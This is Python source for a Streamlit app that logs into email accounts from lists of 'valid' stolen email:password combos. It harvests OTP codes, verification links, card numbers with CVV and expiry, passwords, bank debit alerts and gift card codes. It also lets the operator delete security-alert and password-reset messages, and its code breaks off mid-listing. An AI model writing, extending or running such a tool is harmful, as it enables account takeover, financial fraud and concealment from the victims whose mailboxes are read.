import streamlit as st
import imaplib
import glob
import os
import re
import base64
import math
import time
import socket
from typing import List, Tuple
from email.header import decode_header
from email import message_from_bytes

try:
    from hosts import host_list
except ImportError:
    def host_list(email: str) -> List[str]:
        domain = email.split("@")[-1].lower() if "@" in email else ""
        return [f"imap.{domain}"] if domain else ["imap.gmail.com"]

# Page Configuration & Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Initialize Isolated Session State Variables
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "folder_map" not in st.session_state:
    st.session_state.folder_map = {"INBOX": "INBOX"}
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 1
if "search_current_page" not in st.session_state:
    st.session_state.search_current_page = 1
if "otp_current_page" not in st.session_state:
    st.session_state.otp_current_page = 1
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []
if "bot_diag_logs" not in st.session_state:
    st.session_state.bot_diag_logs = []
if "search_diag_logs" not in st.session_state:
    st.session_state.search_diag_logs = []
if "otp_diag_logs" not in st.session_state:
    st.session_state.otp_diag_logs = []
if "current_messages" not in st.session_state:
    st.session_state.current_messages = []
if "search_messages" not in st.session_state:
    st.session_state.search_messages = []
if "otp_messages" not in st.session_state:
    st.session_state.otp_messages = []
if "total_matched_count" not in st.session_state:
    st.session_state.total_matched_count = 0
if "search_total_matched_count" not in st.session_state:
    st.session_state.search_total_matched_count = 0
if "otp_total_matched_count" not in st.session_state:
    st.session_state.otp_total_matched_count = 0
if "bot_filter_mode" not in st.session_state:
    st.session_state.bot_filter_mode = False
if "selected_account" not in st.session_state:
    st.session_state.selected_account = "none"
if "custom_email" not in st.session_state:
    st.session_state.custom_email = ""
if "custom_pass" not in st.session_state:
    st.session_state.custom_pass = ""
if "custom_host" not in st.session_state:
    st.session_state.custom_host = ""


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]


def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)


def bot_log(msg):
    st.session_state.bot_diag_logs.append(msg)


def search_log(msg):
    st.session_state.search_diag_logs.append(msg)


def otp_log(msg):
    st.session_state.otp_diag_logs.append(msg)


def load_valid():
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email_val, pwd = line.split(":", 1)
                    combo = f"{email_val.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows


def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
                    res.append(decoded + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    return "".join(res)


def clean_display_label(folder_name: str) -> str:
    upper_name = folder_name.upper()
    if upper_name == "INBOX":
        return "INBOX"
    if upper_name.startswith("INBOX.") or upper_name.startswith("INBOX/"):
        return folder_name[6:]
    return folder_name


def parse_imap_list_line(s: str) -> Tuple[str, str, str]:
    s = s.strip()
    flags, delim, raw_name = "", '"."', s
    if s.startswith("("):
        end_paren = s.find(")")
        if end_paren != -1:
            flags = s[1:end_paren].strip()
            remainder = s[end_paren + 1:].strip()
            parts = remainder.split(None, 1)
            if len(parts) >= 1:
                delim = parts[0]
            raw_name = parts[1].strip() if len(parts) == 2 else ""

    if raw_name.startswith('"') and raw_name.endswith('"') and len(raw_name) >= 2:
        raw_name = raw_name[1:-1].replace('\\"', '"')

    return flags, delim, raw_name


def get_imap_path(selected_ui_folder: str) -> str:
    folder_map = st.session_state.get("folder_map", {})
    return folder_map.get(selected_ui_folder, selected_ui_folder)


def list_folders(mail, email_addr: str = "", host_val: str = ""):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log(f"📧 [TARGET ACCOUNT] Email: '{email_addr}' | Host: '{host_val}'")
    debug_log("🔍 [ENGINE START] Issuing IMAP command: LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server Response Code: '{typ}' | Raw Records Count: {len(data) if data else 0}")
        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                try:
                    s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                    s = s.strip()
                    debug_log(f"\n  ├─ [Line #{idx} Raw]: {s}")
                    flags, delim, clean_name = parse_imap_list_line(s)
                    flags_lower = flags.lower()

                    if r"\noselect" in flags_lower or r"\nonexistent" in flags_lower:
                        debug_log("  │   └─ ⚠️ FILTERED OUT: Flagged as \\Noselect or \\Nonexistent")
                        continue

                    if clean_name and clean_name not in (".", "/", '""', "''"):
                        decoded_folder = decode_imap_utf7(clean_name)
                        ui_label = clean_display_label(decoded_folder)
                        found.add(decoded_folder)
                        debug_log(f"  │   └─ ✅ ACCEPTED FOLDER: Raw='{decoded_folder}' -> UI='{ui_label}'")
                except Exception as line_ex:
                    debug_log(f"  │   └─ ⚠️ PARSE ERROR: {line_ex}")
                    continue
    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Folder enumeration failed: {ex}")

    if not found:
        found.add("INBOX")

    sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
    folder_map, display_folders = {}, []
    for raw_f in sorted_raw:
        label = clean_display_label(raw_f)
        folder_map[label] = raw_f
        display_folders.append(label)

    st.session_state.folder_map = folder_map
    return display_folders


def open_mail(email_addr, password_val, host_val, timeout=60):
    mail = imaplib.IMAP4_SSL(host_val, 993, timeout=timeout)
    mail.login(email_addr, password_val)
    return mail


def close_mail(mail):
    try:
        mail.logout()
    except Exception:
        try:
            mail.shutdown()
        except Exception:
            pass


def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
    """Detects sextortion, ransom, and bitcoin extortion emails."""
    extortion_keywords = [
        "bitcoin wallet", "transfer me", "deactivate and remove all malware",
        "posted to the public", "recorded all your actions", "trojan",
        "remote control function", "my servers", "pay bitcoin", "ransom"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in extortion_keywords)


def is_bot_message(subject, body, frm=""):
    if is_extortion_spam(subject, body, frm):
        return False

    bot_keywords = [
        "otp", "verification", "verify", "security alert", "password reset",
        "code", "confirm", "login", "auth", "signin", "token", "activation",
        "mcafee", "iptv", "lot", "credential", 
        "application password", "cvv", "exp date", "debit", "bank debit", "online purchase",
        "tracking number", "order tracking", "purchase order", "purchase confirmation",
        "telegram", "tg", "t.me", "telegram notification", "telegram alert", "telegram code",
        "blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist"
    ]
    combined = f"{subject} {body} {frm}".lower()
    return any(kw in combined for kw in bot_keywords)


def extract_pins_and_links(text):
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


def extract_credentials_and_cards(text):
    card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
    cards = re.findall(card_pattern, text)
    cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]

    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)
    
    formatted_cards = []
    for c in cleaned_cards:
        detail = f"Card: {c}"
        if card_exp:
            detail += f" | EXP: {card_exp[0]}"
        if card_cvv:
            detail += f" | CVV: {card_cvv[0]}"
        formatted_cards.append(detail)

    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card)\s*[:=]\s*(\S+)', text)
    
    debit_sources = []
    
    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited)\s*[:=]?\s*([^\n\r,.]+)', text)
    if bank_debits:
        debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")
        
    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at)\s*[:=]?\s*([^\n\r,.]+)', text)
    if online_debits:
        debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")
        
    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card)\s*[:=]?\s*([^\n\r,.]+)', text)
    if card_debits:
        debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")
        
    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if orders:
        debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")
        
    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
    if trackings:
        debit_sources.append(f"Tracking #: {trackings[0].strip()}")

    formatted_cards.extend(debit_sources)

    return list(dict.fromkeys(formatted_cards)), list(dict.fromkeys(cred_patterns))


def clean_boilerplate(text):
    if not text:
        return ""
    patterns = [
        (r"unsubscribe.*?(?:\n|$)", re.IGNORECASE),
        (r"privacy policy.*?(?:\n|$)", re.IGNORECASE),
        (r"confidentiality notice.*?(?:\n\n|$)", re.IGNORECASE),
        (r"this email was sent by.*?(?:\n|$)", re.IGNORECASE)
    ]
    cleaned = text
    for pat, flags in patterns:
        cleaned = re.sub(pat, "", cleaned, flags=flags)
    return cleaned.strip()


def build_imap_or_query(terms: List[str], field_cmd: str) -> str:
    cleaned_terms = [t.strip() for t in terms if t.strip()]
    if not cleaned_terms:
        return f'{field_cmd} ""'
    if len(cleaned_terms) == 1:
        return f'{field_cmd} "{cleaned_terms[0]}"'

    query = f'{field_cmd} "{cleaned_terms[-1]}"'
    for term in reversed(cleaned_terms[:-1]):
        query = f'OR {field_cmd} "{term}" ({query})'
    return query


def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str], 
                            search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH", 
                            page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
                            log_target: str = "DEBUG"):
    if log_target == "SEARCH":
        st.session_state.search_diag_logs = []
        log_func = search_log
    elif log_target == "OTP":
        st.session_state.otp_diag_logs = []
        log_func = otp_log
    else:
        log_func = debug_log

    messages = []
    start_time = time.time()
    
    clean_query = search_query.strip()
    log_func(f"⚙️ [ENGINE INIT] Mode: '{mode}' | Target Folders ({len(target_folders)}): {target_folders}")
    log_func(f"🔎 [SEARCH SPECS] Query: '{clean_query}' | Search Field: '{search_field}' | Page: {page_number} | Page Size: {page_size}")

    total_matched_all_folders = 0

    for f_label in target_folders:
        real_imap_folder = get_imap_path(f_label)
        log_func(f"\n📂 [PROCESSING FOLDER] Label='{f_label}' -> IMAP Path='{real_imap_folder}'")
        
        try:
            sel_typ, sel_data = mail.select(f'"{real_imap_folder}"', readonly=True)
            log_func(f"  ├─ [IMAP SELECT] Status: '{sel_typ}' | Response: {sel_data}")
            
            if sel_typ != "OK":
                log_func(f"  └─ ⚠️ Skipped folder '{f_label}': Failed to select IMAP path.")
                continue

            if mode == "FOLDER_ONLY" or not clean_query:
                cmd = "SEARCH ALL"
                log_func(f"  ├─ [EXECUTING COMMAND] {cmd}")
                typ, data = mail.search(None, "ALL")
            else:
                field_cmd = search_field if search_field in ("TEXT", "SUBJECT", "FROM", "BODY") else "TEXT"
                terms = clean_query.split()
                
                if len(terms) > 1:
                    or_query = build_imap_or_query(terms, field_cmd)
                    log_func(f"  ├─ [EXECUTING COMMAND] SEARCH {or_query}")
                    typ, data = mail.search(None, or_query)
                    
                    if typ != "OK" or not (data and data[0]):
                        log_func("  ├─ [RETRY FALLBACK] Multi-term OR query yielded 0 results or failed. Retrying individual keywords...")
                        matched_ids_set = set()
                        for term in terms[:10]:
                            sub_typ, sub_data = mail.search(None, field_cmd, f'"{term}"')
                            if sub_typ == "OK" and sub_data and sub_data[0]:
                                matched_ids_set.update((sub_data[0] or b"").split())
                        typ = "OK"
                        data = [b" ".join(sorted(matched_ids_set, key=lambda x: int(x)))]
                else:
                    cmd = f'SEARCH {field_cmd} "{clean_query}"'
                    log_func(f"  ├─ [EXECUTING COMMAND] {cmd}")
                    typ, data = mail.search(None, field_cmd, f'"{clean_query}"')

            log_func(f"  ├─ [IMAP SEARCH RESPONSE] Status: '{typ}' | Raw Bytes: {data}")
            ids = (data[0] or b"").split() if typ == "OK" and data else []
            total_matched_all_folders += len(ids)
            log_func(f"  ├─ [MATCHES COUNT] Found {len(ids)} message IDs in '{f_label}'.")

            if sort_order == "Newest First":
                ids = list(reversed(ids))

            start_idx = (page_number - 1) * page_size
            end_idx = start_idx + page_size
            target_ids = ids[start_idx:end_idx]

            log_func(f"  ├─ [PAGINATION RANGE] Total IDs: {len(ids)} | Fetching range index [{start_idx}:{end_idx}] -> {len(target_ids)} target IDs")

            for idx, mid in enumerate(target_ids, 1):
                msg_start = time.time()
                
                typ, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")
                
                if not msgdata or not isinstance(msgdata[0], tuple):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
                    continue

                raw_msg_bytes = msgdata[0][1]
                msg = message_from_bytes(raw_msg_bytes)
                subject = decode_hdr(msg.get("Subject", ""))
                frm = decode_hdr(msg.get("From", ""))
                to_hdr = decode_hdr(msg.get("To", ""))
                date_val = decode_hdr(msg.get("Date", ""))
                flags_str = str(msgdata[0][0])
                is_read = "\\Seen" in flags_str

                body_text = ""
                if msg.is_multipart():
                    for part in msg.walk():
                        if part.get_content_type() == "text/plain":
                            try:
                                body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                break
                            except Exception:
                                pass
                else:
                    try:
                        body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                    except Exception:
                        pass

                if is_extortion_spam(subject, body_text, frm):
                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ EXCLUDED: Extortion / Ransom Spam detected.")
                    continue

                cleaned_body = clean_boilerplate(body_text)
                pins, links = extract_pins_and_links(body_text)
                cards, creds = extract_credentials_and_cards(body_text)
                is_bot = is_bot_message(subject, body_text, frm)

                messages.append({
                    "id": mid.decode(),
                    "folder": f_label,
                    "from": frm,
                    "to": to_hdr,
                    "subject": subject,
                    "date": date_val,
                    "is_read": is_read,
                    "is_bot": is_bot,
                    "body": cleaned_body,
                    "pins": pins,
                    "links": links,
                    "cards": cards,
                    "creds": creds,
                    "raw": raw_msg_bytes,
                    "flags": flags_str,
                    "size_bytes": len(raw_msg_bytes)
                })
                
                fetch_elapsed = round((time.time() - msg_start) * 1000, 2)
                log_func(
                    f"  │   ├─ [Msg #{idx} | ID: {mid.decode()}] Parsed in {fetch_elapsed}ms | Size: {len(raw_msg_bytes)}B | "
                    f"From: '{frm}' | To: '{to_hdr}' | Subject: '{subject}' | "
                    f"Flags: {flags_str} | BotDetected={is_bot} | Pins={pins} | Cards={cards}"
                )

        except (socket.timeout, TimeoutError):
            log_func(f"  └─ ❌ [TIMEOUT ERROR] Folder '{f_label}' timed out during IMAP search. Try using 'SUBJECT' or 'FROM' field for large mailboxes.")
        except Exception as ex:
            log_func(f"  └─ ❌ [EXCEPTION ERROR] Querying folder '{f_label}' failed: {ex}")

    total_elapsed = round(time.time() - start_time, 2)
    if log_target == "SEARCH":
        st.session_state.search_total_matched_count = total_matched_all_folders
    elif log_target == "OTP":
        st.session_state.otp_total_matched_count = total_matched_all_folders
    else:
        st.session_state.total_matched_count = total_matched_all_folders

    log_func(f"\n🏁 [ENGINE COMPLETE] Total retrieved page messages: {len(messages)} / {total_matched_all_folders} matched | Execution time: {total_elapsed}s")
    return messages


# Header
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.caption("Advanced IMAP Client with Interactive Bot Intelligence, Dedicated OTP, Debit/Credit Card & Credentials Scanner, Multi-Field Search, Telegram/Blacklist Filter, and Deep Diagnostic Instrumentation.")

valid = load_valid()

# Valid Account Selection Dropdown on Main Screen bound to st.session_state
pick = st.selectbox("Valid account", valid or ["none"], key="selected_account")

# Sidebar Hub
st.sidebar.header("Account & Connection Hub")

# Download Button for Valid Mail List in Slide Out Sidebar
if valid:
    valid_text_data = "\n".join(valid)
    st.sidebar.download_button(
        label="📥 Download Valid Mail List",
        data=valid_text_data,
        file_name="valid_accounts.txt",
        mime="text/plain",
        use_container_width=True
    )

st.sidebar.text_input("Email override", key="custom_email")
st.sidebar.text_input("Password override", type="password", key="custom_pass")
st.sidebar.text_input("IMAP host override", key="custom_host")

# Resolve Email and Password Isolated per Session
if st.session_state.custom_email.strip():
    email = st.session_state.custom_email.strip()
    password = st.session_state.custom_pass.strip()
elif ":" in st.session_state.selected_account:
    email, password = st.session_state.selected_account.split(":", 1)
else:
    email, password = "", ""

override = st.session_state.custom_host.strip()

# Quick Refresh Inbox Control
if st.sidebar.button("🔄 Refresh Inbox", type="secondary", use_container_width=True):
    if email and password:
        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        mail_obj = None
        try:
            with st.spinner("Refreshing Inbox..."):
                mail_obj = open_mail(email, password, host, timeout=60)
                st.session_state.current_messages = fetch_messages_paginated(
                    mail_obj, email, password, host, ["INBOX"], mode="FOLDER_ONLY", 
                    page_size=15, page_number=1, sort_order="Newest First", log_target="DEBUG"
                )
                close_mail(mail_obj)
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                st.sidebar.success("Inbox refreshed successfully!")
        except Exception as e:
            st.sidebar.error(f"Refresh failed: {e}")
            if mail_obj:
                close_mail(mail_obj)

# Webmail Portal & Credentials Output
if email and password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials", value=f"{email}:{password}")

# Connect & Discover Folders button under Valid Account dropdown on main screen
if st.button("Connect & Discover Folders", type="primary", use_container_width=True):
    if not email or not password:
        st.error("Need email and password")
    else:
        hosts = [override] if override else host_list(email)
        last, connected_host, folders, success = "no host", "", ["INBOX"], False

        with st.spinner("Connecting and discovering folders..."):
            for host in hosts:
                mail_obj = None
                try:
                    mail_obj = open_mail(email, password, host, timeout=60)
                    folders = list_folders(mail_obj, email_addr=email, host_val=host)
                    close_mail(mail_obj)
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if mail_obj:
                        close_mail(mail_obj)

        if success:
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            log(f"Discovered {len(folders)} folders via {connected_host}")
            st.success(f"Connected: {connected_host} ({len(folders)} folders)")
        else:
            st.error(last)

# Debug Expander for Discovery
if st.session_state.folder_debug_logs:
    with st.expander("🛠️ Folder Discovery Diagnostic Traces", expanded=False):
        st.code("\n".join(st.session_state.folder_debug_logs), language="text")

# Controls Layout
col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 50, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

# Direct Folder Load Trigger
if st.button("📂 Load Folder Messages", type="primary", use_container_width=True):
    host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    if not email or not password or not host:
        st.error("Please connect and load folders first.")
    else:
        mail = None
        try:
            with st.spinner(f"Loading folder '{folder}'..."):
                mail = open_mail(email, password, host, timeout=60)
                msgs = fetch_messages_paginated(
                    mail, email, password, host, [folder], mode="FOLDER_ONLY",
                    page_size=page_size, page_number=1, sort_order=sort_order, log_target="DEBUG"
                )
                st.session_state.current_messages = msgs
                st.session_state.current_page = 1
                st.session_state.bot_filter_mode = False
                log(f"Loaded {len(msgs)} messages from folder '{folder}'.")
        except Exception as e:
            st.error(str(e))
        finally:
            if mail:
                close_mail(mail)

# -----------------------------------------------------------------------------
# MAIN MESSAGE STREAM
# -----------------------------------------------------------------------------
if st.session_state.bot_filter_mode:
    active_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    st.info("⚠️ Message stream is currently filtered to show DETECTED BOT/SPAM/TELEGRAM/BLACKLIST MESSAGES ONLY.")
else:
    active_msgs = st.session_state.current_messages

total_msgs = st.session_state.total_matched_count or len(active_msgs)

if len(active_msgs) > 0:
    st.markdown("---")
    
    total_pages = max(1, math.ceil(total_msgs / page_size))
    curr_p = st.session_state.current_page
    
    st.markdown("### ✉️ Message Stream")
    st.markdown(f"**Showing Page {curr_p} of {total_pages} (Total Server Matches: {total_msgs})**")

    for idx, msg in enumerate(active_msgs):
        status_icon = "📖" if msg["is_read"] else "📩"
        bot_badge = " [🤖 BOT/OTP/TELEGRAM/BLACKLIST]" if msg["is_bot"] else ""
        folder_badge = f" [{msg['folder']}]"

        with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{bot_badge}", expanded=False):
            st.write(f"**Folder:** {msg['folder']}")
            st.write(f"**From:** {msg['from']}")
            st.write(f"**To:** {msg['to']}")
            st.write(f"**Subject:** {msg['subject']}")
            st.write(f"**Date:** {msg['date']}")
            st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

            if msg["pins"]:
                st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
            if msg.get("cards"):
                st.warning(f"💳 **Detected Debit / Credit Card / Transaction Details:** {', '.join(msg['cards'])}")
            if msg.get("creds"):
                st.info(f"🔒 **Extracted Login/Credential Passwords:** {', '.join(msg['creds'])}")
            if msg["links"]:
                st.markdown("🔗 **Actionable Verification Links:**")
                for link in msg["links"]:
                    st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

            st.markdown("---")
            st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['folder']}_{msg['id']}_{idx}")

            op_col1, op_col2, op_col3, op_col4 = st.columns(4)
            host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            real_imap_folder = get_imap_path(msg['folder'])

            with op_col1:
                if not msg["is_read"]:
                    if st.button("Mark as Read", key=f"read_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_folder}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Seen')
                            close_mail(m_client)
                            msg["is_read"] = True
                            st.success("Marked as read!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

            with op_col2:
                target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                if st.button("Move Message", key=f"mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                    try:
                        real_target_path = get_imap_path(target_move)
                        m_client = open_mail(email, password, host, timeout=60)
                        m_client.select(f'"{real_imap_folder}"', readonly=False)
                        m_client.copy(msg["id"], f'"{real_target_path}"')
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        close_mail(m_client)
                        st.session_state.current_messages.remove(msg)
                        st.success(f"Moved to {target_move}!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col3:
                del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                if st.button(del_label, key=f"del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                    try:
                        m_client = open_mail(email, password, host, timeout=60)
                        m_client.select(f'"{real_imap_folder}"', readonly=False)
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        close_mail(m_client)
                        st.session_state.current_messages.remove(msg)
                        st.success("Deleted message!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col4:
                with st.popover("View Raw RFC822"):
                    st.code(msg["raw"].decode("utf-8", errors="ignore"))

    # Pagination Controls Bar
    st.markdown("---")
    p_col1, p_col2, p_col3 = st.columns([1, 2, 1])

    with p_col1:
        if st.button("Previous Page", disabled=(curr_p <= 1), use_container_width=True, key="msg_stream_prev"):
            st.session_state.current_page -= 1
            host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            mail = open_mail(email, password, host, timeout=60)
            st.session_state.current_messages = fetch_messages_paginated(
                mail, email, password, host, [folder], 
                mode="FOLDER_ONLY",
                page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                log_target="DEBUG"
            )
            close_mail(mail)
            st.rerun()

    with p_col2:
        st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {curr_p} of {total_pages}</h4>", unsafe_allow_html=True)

    with p_col3:
        if st.button("Next Page", disabled=(curr_p >= total_pages), use_container_width=True, key="msg_stream_next"):
            st.session_state.current_page += 1
            host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            mail = open_mail(email, password, host, timeout=60)
            st.session_state.current_messages = fetch_messages_paginated(
                mail, email, password, host, [folder], 
                mode="FOLDER_ONLY",
                page_size=page_size, page_number=st.session_state.current_page, sort_order=sort_order,
                log_target="DEBUG"
            )
            close_mail(mail)
            st.rerun()

# -----------------------------------------------------------------------------
# SEPARATE STANDALONE OTP / DEBIT & CREDIT CARD / CREDENTIAL SCANNER ECOSYSTEM
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scanner", expanded=True):
    st.markdown("#### Dynamic OTP, Password, Debit & Credit Cards, Gift Cards, Telegram & Credential Scanner Controls")
    
    otp_c1, otp_c2, otp_c3 = st.columns([2, 1, 1])
    
    otp_folder_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with otp_c1:
        otp_scope_choice = st.multiselect(
            "Target Folder Scope", 
            otp_folder_options, 
            default=["INBOX"], 
            key="otp_scan_scope"
        )
    with otp_c2:
        category_options = [
            "All Security Categories", 
            "Debit Card & Credit Card Details", 
            "Bank Debit Alert & Online Debit",
            "Order Tracking & Purchase Confirmation",
            "OTP Message & Verification", 
            "Telegram Alerts & Blacklist",
            "Password / Reset Code", 
            "Gift Cards", 
            "ID Cards / Credentials", 
            "Application Passwords", 
            "Login Info / Info"
        ]
        otp_scan_category = st.multiselect(
            "Target Data Type Dropdown", 
            category_options,
            default=["All Security Categories"],
            key="otp_category_select"
        )
    with otp_c3:
        otp_search_field = st.selectbox("Scan Field", ["TEXT", "SUBJECT", "BODY", "FROM"], key="otp_search_field")

    # Dedicated Controls
    t_col1, t_col2 = st.columns(2)
    with t_col1:
        otp_auto_clean_toggle = st.toggle("Auto-Clean HTML & Boilerplate", value=True, key="otp_clean_toggle")
    with t_col2:
        otp_deep_regex_chk = st.checkbox("Enable Deep Regex Code, Debit & Credit Card Extraction", value=True, key="otp_regex_chk")

    # Preset Keyword Mapping
    preset_keywords_map = {
        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned",
        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment",
        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid",
        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking",
        "OTP Message & Verification": "OTP verification code verify auth token pin",
        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam",
        "Password / Reset Code": "password reset passwd new password",
        "Gift Cards": "gift card claim code voucher redeem",
